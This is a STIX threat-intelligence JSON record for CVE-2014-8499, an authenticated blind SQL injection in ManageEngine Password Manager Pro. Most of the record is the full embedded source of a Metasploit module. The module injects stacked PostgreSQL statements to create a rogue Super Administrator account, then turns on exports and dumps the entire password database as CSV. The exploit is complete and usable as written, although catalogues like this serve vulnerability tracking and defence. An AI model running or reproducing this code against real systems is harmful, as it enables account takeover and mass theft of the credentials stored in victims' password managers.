{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1820ebc5-9dbf-4556-ac28-b0361daba354",
    "created": "2024-08-14T16:24:08.27414Z",
    "modified": "2024-08-14T16:24:08.274144Z",
    "name": "ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection",
    "description": " ManageEngine Password Manager Pro (PMP) has an authenticated blind SQL injection vulnerability in SQLAdvancedALSearchResult.cc that can be abused to escalate privileges and obtain Super Administrator access. A Super Administrator can then use his privileges to dump the whole password database in CSV format. PMP can use both MySQL and PostgreSQL databases but this module only exploits the latter as MySQL does not support stacked queries with Java. PostgreSQL is the default database in v6.8 and above, but older PMP versions can be upgraded and continue using MySQL so a higher version does not guarantee exploitability. This module has been tested on v6.8 to v7.1 build 7104 on both Windows and Linux. The vulnerability is fixed in v7.1 build 7105 and above. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/manageengine_pmp_privesc.rb",
            "external_id": "manageengine_pmp_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8499"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2014/Nov/18"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_pmp_privesc.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection',\n        'Description' => %q{\n          ManageEngine Password Manager Pro (PMP) has an authenticated blind SQL injection\n          vulnerability in SQLAdvancedALSearchResult.cc that can be abused to escalate\n          privileges and obtain Super Administrator access. A Super Administrator can then\n          use his privileges to dump the whole password database in CSV format. PMP can use\n          both MySQL and PostgreSQL databases but this module only exploits the latter as\n          MySQL does not support stacked queries with Java. PostgreSQL is the default database\n          in v6.8 and above, but older PMP versions can be upgraded and continue using MySQL,\n          so a higher version does not guarantee exploitability. This module has been tested\n          on v6.8 to v7.1 build 7104 on both Windows and Linux. The vulnerability is fixed in\n          v7.1 build 7105 and above.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2014-8499' ],\n          [ 'OSVDB', '114485' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Nov/18' ],\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_pmp_privesc.txt' ],\n        ],\n        'DisclosureDate' => '2014-11-08'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(7272),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptString.new('USERNAME', [true, 'The username to login as', 'guest']),\n        OptString.new('PASSWORD', [true, 'Password for the specified username', 'guest']),\n        OptString.new('TARGETURI', [ true, 'Password Manager Pro application URI', '/'])\n      ]\n    )\n  end\n\n  def login(username, password)\n    # 1st step: we obtain a JSESSIONID cookie...\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'PassTrixMain.cc')\n    })\n\n    if res && res.code == 200\n      # 2nd step: we try to get the ORGN_NAME and AUTHRULE_NAME from the page (which is only needed for the MSP versions)\n      if res.body && res.body.to_s =~ /id=\"ORGN_NAME\" name=\"ORGN_NAME\" value=\"(\\w*)\"/\n        orgn_name = ::Regexp.last_match(1)\n      else\n        orgn_name = nil\n      end\n\n      if res.body && res.body.to_s =~ /id=\"AUTHRULE_NAME\" name=\"AUTHRULE_NAME\" value=\"(\\w*)\"/\n        authrule_name = ::Regexp.last_match(1)\n      else\n        authrule_name = nil\n      end\n\n      # 3rd step: we try to get the domainName for the user\n      cookie = res.get_cookies\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'login', 'AjaxResponse.jsp'),\n        'ctype' => 'application/x-www-form-urlencoded',\n        'cookie' => cookie,\n        'vars_get' => {\n          'RequestType' => 'GetUserDomainName',\n          'userName' => username\n        }\n      })\n      if res && res.code == 200 && res.body\n        domain_name = res.body.to_s.strip\n      else\n        domain_name = nil\n      end\n\n      # 4th step: authenticate to j_security_check, follow the redirect to PassTrixMain.cc and get its cookies.\n      # For some reason send_request_cgi! doesn't work, so follow the redirect manually...\n      vars_post = {\n        'j_username' => username,\n        'username' => username,\n        'j_password' => password\n      }\n      vars_post['ORGN_NAME'] = orgn_name if orgn_name\n      vars_post['AUTHRULE_NAME'] = authrule_name if authrule_name\n      vars_post['domainName'] = domain_name if domain_name\n\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'j_security_check;' + cookie.to_s.gsub(';', '')),\n        'ctype' => 'application/x-www-form-urlencoded',\n        'cookie' => cookie,\n        'vars_post' => vars_post\n      })\n      if res && res.code == 302\n        res = send_request_cgi({\n          'method' => 'GET',\n          'uri' => normalize_uri(target_uri.path, 'PassTrixMain.cc'),\n          'cookie' => cookie\n        })\n\n        if res && res.code == 200\n          # 5th step: get the c ookies sent in the last response\n          return res.get_cookies\n        end\n      end\n    end\n    return nil\n  end\n\n  def inject_sql(old_style)\n    # On versions older than 7000 the injection is slightly different (we call it \"old style\").\n    # For \"new style\" versions we can escalate to super admin by doing\n    # \"update aaaauthorizedrole set role_id=1 where account_id=#{user_id};insert into ptrx_superadmin values (#{user_id},true);\"\n    # However for code simplicity let's just create a brand new user which works for both \"old style\" and \"new style\" versions.\n    if old_style\n      sqli_prefix = '\\\\\\'))) GROUP BY \"PTRX_RID\",\"PTRX_AID\",\"PTRX_RNAME\",\"PTRX_DESC\",\"DOMAINNAME\",\"PTRX_LNAME\",\"PTRX_PWD\",\"PTRX_ATYPE\",\"PTRX_DNSN\",\"PTRX_DEPT\",\"PTRX_LOTN\",\"PTRX_OSTYPE\",\"PTRX_RURL\",\"C1\",\"C2\",\"C3\",\"C4\",\"C5\",\"C6\",\"C7\",\"C8\",\"C9\",\"C10\",\"C11\",\"C12\",\"C13\",\"C14\",\"C15\",\"C16\",\"C17\",\"C18\",\"C19\",\"C20\",\"C21\",\"C22\",\"C23\",\"C24\",\"A1\",\"A2\",\"A3\",\"A4\",\"A5\",\"A6\",\"A7\",\"A8\",\"A9\",\"A10\",\"A11\",\"A12\",\"A13\",\"A14\",\"A15\",\"A16\",\"A17\",\"A18\",\"A19\",\"A20\",\"A21\",\"A22\",\"A23\",\"A24\",\"PTRX_NOTES\") as ' + Rex::Text.rand_text_alpha_lower(rand(3..10)) + ';'\n    else\n      sqli_prefix = '\\\\\\'))))) GROUP BY \"PTRX_RID\",\"PTRX_AID\",\"PTRX_RNAME\",\"PTRX_DESC\",\"DOMAINNAME\",\"PTRX_LNAME\",\"PTRX_PWD\",\"PTRX_ATYPE\",\"PTRX_DNSN\",\"PTRX_DEPT\",\"PTRX_LOTN\",\"PTRX_OSTYPE\",\"PTRX_RURL\",\"C1\",\"C2\",\"C3\",\"C4\",\"C5\",\"C6\",\"C7\",\"C8\",\"C9\",\"C10\",\"C11\",\"C12\",\"C13\",\"C14\",\"C15\",\"C16\",\"C17\",\"C18\",\"C19\",\"C20\",\"C21\",\"C22\",\"C23\",\"C24\",\"A1\",\"A2\",\"A3\",\"A4\",\"A5\",\"A6\",\"A7\",\"A8\",\"A9\",\"A10\",\"A11\",\"A12\",\"A13\",\"A14\",\"A15\",\"A16\",\"A17\",\"A18\",\"A19\",\"A20\",\"A21\",\"A22\",\"A23\",\"A24\",\"PTRX_NOTES\") AS Ptrx_DummyPwds GROUP BY \"PTRX_RID\",\"PTRX_RNAME\",\"PTRX_DESC\",\"PTRX_ATYPE\",\"PTRX_DNSN\",\"PTRX_DEPT\",\"PTRX_LOTN\",\"PTRX_OSTYPE\",\"PTRX_RURL\",\"C1\",\"C2\",\"C3\",\"C4\",\"C5\",\"C6\",\"C7\",\"C8\",\"C9\",\"C10\",\"C11\",\"C12\",\"C13\",\"C14\",\"C15\",\"C16\",\"C17\",\"C18\",\"C19\",\"C20\",\"C21\",\"C22\",\"C23\",\"C24\") as ' + Rex::Text.rand_text_alpha_lower(rand(3..10)) + ';'\n    end\n\n    user_id = Rex::Text.rand_text_numeric(4)\n    time = Rex::Text.rand_text_numeric(8)\n    username = Rex::Text.rand_text_alpha_lower(6)\n    username_chr = ''\n    username.each_char do |c|\n      username_chr << 'chr(' << c.ord.to_s << ')||'\n    end\n    username_chr.chop!.chop!\n\n    password = Rex::Text.rand_text_alphanumeric(10)\n    password_chr = ''\n    password.each_char do |c|\n      password_chr << 'chr(' << c.ord.to_s << ')||'\n    end\n    password_chr.chop!.chop!\n\n    group_chr = ''\n    'Default Group'.each_char do |c|\n      group_chr << 'chr(' << c.ord.to_s << ')||'\n    end\n    group_chr.chop!.chop!\n\n    sqli_command =\n      \"insert into aaauser values (#{user_id},$$$$,$$$$,$$$$,#{time},$$$$);\" \\\n      \"insert into aaapassword values (#{user_id},#{password_chr},$$$$,0,2,1,#{time});\" \\\n      \"insert into aaauserstatus values (#{user_id},$$ACTIVE$$,#{time});\" \\\n      \"insert into aaalogin values (#{user_id},#{user_id},#{username_chr});\" \\\n      \"insert into aaaaccount values (#{user_id},#{user_id},1,1,#{time});\" \\\n      \"insert into aaaauthorizedrole values (#{user_id},1);\" \\\n      \"insert into aaaaccountstatus values (#{user_id},-1,0,$$ACTIVE$$,#{time});\" \\\n      \"insert into aaapasswordstatus values (#{user_id},-1,0,$$ACTIVE$$,#{time});\" \\\n      \"insert into aaaaccadminprofile values (#{user_id},$$\" + Rex::Text.rand_text_alpha_upper(8) + '$$,-1,-1,-1,-1,-1,false,-1,-1,-1,$$$$);' \\\n      \"insert into aaaaccpassword values (#{user_id},#{user_id});\" \\\n      \"insert into ptrx_resourcegroup values (#{user_id},3,#{user_id},0,0,0,0,#{group_chr},$$$$);\" \\\n      \"insert into ptrx_superadmin values (#{user_id},true);\"\n    sqli_suffix = '-- '\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'SQLAdvancedALSearchResult.cc'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        'COUNT' => Rex::Text.rand_text_numeric(2),\n        'SEARCH_ALL' => sqli_prefix + sqli_command + sqli_suffix,\n        'USERID' => Rex::Text.rand_text_numeric(4)\n      }\n    })\n\n    return [ username, password ]\n  end\n\n  def get_version\n    res = send_request_cgi({\n      'uri' => normalize_uri('PassTrixMain.cc'),\n      'method' => 'GET'\n    })\n    if res && res.code == 200 && res.body &&\n       res.body.to_s =~ /ManageEngine Password Manager Pro/ &&\n       (\n         res.body.to_s =~ /login\\.css\\?([0-9]+)/ ||                            # PMP v6\n         res.body.to_s =~ /login\\.css\\?version=([0-9]+)/ ||                    # PMP v6\n         res.body.to_s =~ %r{/themes/passtrix/V([0-9]+)/styles/login\\.css\"} # PMP v7\n       )\n      return ::Regexp.last_match(1).to_i\n    else\n      return 9999\n    end\n  end\n\n  def check\n    version = get_version\n    case version\n    when 0..7104\n      return Exploit::CheckCode::Appears\n    when 7105..9998\n      return Exploit::CheckCode::Safe\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def run\n    unless check == Exploit::CheckCode::Appears\n      print_error(\"Fingerprint hasn't been successful, trying to exploit anyway...\")\n    end\n\n    version = get_version\n    @cookie = login(datastore['USERNAME'], datastore['PASSWORD'])\n    if @cookie.nil?\n      fail_with(Failure::NoAccess, \"#{peer} - Failed to authenticate.\")\n    end\n\n    creds = inject_sql(version < 7000)\n    username = creds[0]\n    password = creds[1]\n    print_good(\"Created a new Super Administrator with username: #{username} | password: #{password}\")\n\n    cookie_su = login(username, password)\n\n    if cookie_su.nil?\n      fail_with(Failure::NoAccess, \"#{peer} - Failed to authenticate as Super Administrator, account #{username} might not work.\")\n    end\n\n    print_status('Reporting Super Administrator credentials...')\n    store_valid_credentail(user: username, private: password)\n\n    print_status('Leaking Password database...')\n    loot_passwords(cookie_su)\n  end\n\n  def service_details\n    super.merge({ access_level: 'Super Administrator' })\n  end\n\n  def loot_passwords(cookie_admin)\n    # 1st we turn on password exports\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ConfigureOffline.ve'),\n      'cookie' => cookie_admin,\n      'vars_post' => {\n        'IS_XLS' => 'true',\n        'includePasswd' => 'true',\n        'HOMETAB' => 'true',\n        'RESTAB' => 'true',\n        'RGTAB' => 'true',\n        'PASSWD_RULE' => 'Offline Password File',\n        'LOGOUT_TIME' => '20'\n      }\n    })\n\n    # now get the loot!\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'jsp', 'xmlhttp', 'AjaxResponse.jsp'),\n      'cookie' => cookie_admin,\n      'vars_get' => {\n        'RequestType' => 'ExportResources'\n      }\n    })\n\n    if res && res.code == 200 && res.body && !res.body.to_s.empty?\n      vprint_line(res.body.to_s)\n      print_good('Successfully exported password database from Password Manager Pro.')\n      loot_name = 'manageengine.passwordmanagerpro.password.db'\n      loot_type = 'text/csv'\n      loot_filename = 'manageengine_pmp_password_db.csv'\n      loot_desc = 'ManageEngine Password Manager Pro Password DB'\n      p = store_loot(\n        loot_name,\n        loot_type,\n        rhost,\n        res.body,\n        loot_filename,\n        loot_desc\n      )\n      print_status(\"Password database saved in: #{p}\")\n    else\n      print_error('Failed to export Password Manager Pro passwords.')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-08"
}